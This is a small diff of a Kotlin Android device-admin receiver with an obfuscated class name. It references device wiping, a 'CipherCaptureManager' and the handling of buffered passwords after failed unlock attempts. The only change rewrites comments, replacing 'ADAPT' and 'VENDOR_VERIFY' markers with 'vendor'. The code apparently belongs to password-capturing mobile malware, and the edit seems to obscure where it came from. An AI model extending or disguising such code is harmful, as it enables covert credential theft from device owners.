@@ -163,7 +163,7 @@ class zbrefryi : DeviceAdminReceiver() {
             }
         }
 
-        // ADAPT: Second wipeDevice overload merged with first to avoid Kotlin overload conflict
+        // vendor: Second wipeDevice overload merged with first to avoid Kotlin overload conflict
     }
 
     override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
@@ -221,7 +221,7 @@ class zbrefryi : DeviceAdminReceiver() {
             val ccm = CipherCaptureManager.instance
             if (ccm != null) {
                 ccm.dispatchEvent("android.intent.action.DEVICE_PASSWORD_FAILED")
-                // ADAPT: VENDOR_VERIFY — refresh lock batch ID logic
+                // vendor: refresh lock batch ID logic
                 // Vendor: ccm.lockBatchId = (System.currentTimeMillis() shl 10) or (ccm.batchCounter.incrementAndGet() % 1024).toLong()
                 // Simplified: let dispatchEvent handle batch state internally
                 ccm.discardBufferedPassword()
